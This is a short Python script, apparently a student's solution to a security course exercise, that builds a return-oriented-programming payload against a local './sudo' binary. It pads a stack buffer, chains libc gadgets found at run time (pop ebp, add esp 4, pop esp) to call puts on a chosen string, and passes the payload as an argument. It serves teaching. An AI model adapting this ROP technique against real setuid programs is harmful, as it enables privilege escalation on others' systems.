import os, sys
import struct
import addresses
import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'

# "" 0xb7c393af


def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg():
    search = GadgetSearch(LIBC_DUMP_PATH)
    # NOTES:
    # 1. Use `addresses.PUTS` to get the address of the `puts` function.
    # 2. Don't write addresses of gadgets directly - use the search object to
    #    find the address of the gadget dynamically.
     
    
    cond = lambda x: True if '00' not in [x[1][j:j+2] for j in range(0,len(x[1])-1,2)] else False
    lst=[]
    msg = "A"*8 + "B"*54+"C"*4
    #Load the adress of puts into EBP
    #print(len(msg))

    lst = search.find_format("pop ebp",condition = cond)
    cmd =int(lst[1],16)
    msg+= struct.pack('<I',cmd)

    msg+= addresses.address_to_bytes(addresses.PUTS)
	#return address
    msg+= addresses.address_to_bytes(addresses.PUTS)

    #skip 4bytes
    lst = search.find_format("add esp, 4",condition = cond)
    cmd =int(lst[1],16)
    msg+= struct.pack('<I',cmd)


    #pointer to string
    msg += struct.pack('<I',0xbfffe1ba+len(msg)+12)

     #jump to 2 stage
    lst = search.find_format("pop esp",condition = cond)
    cmd =int(lst[1],16)
    msg+= struct.pack('<I',cmd)

    
    msg += struct.pack('<I',0xbfffe1ba+74)

    #call func
    msg+=get_string('332305747')
    return msg
def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
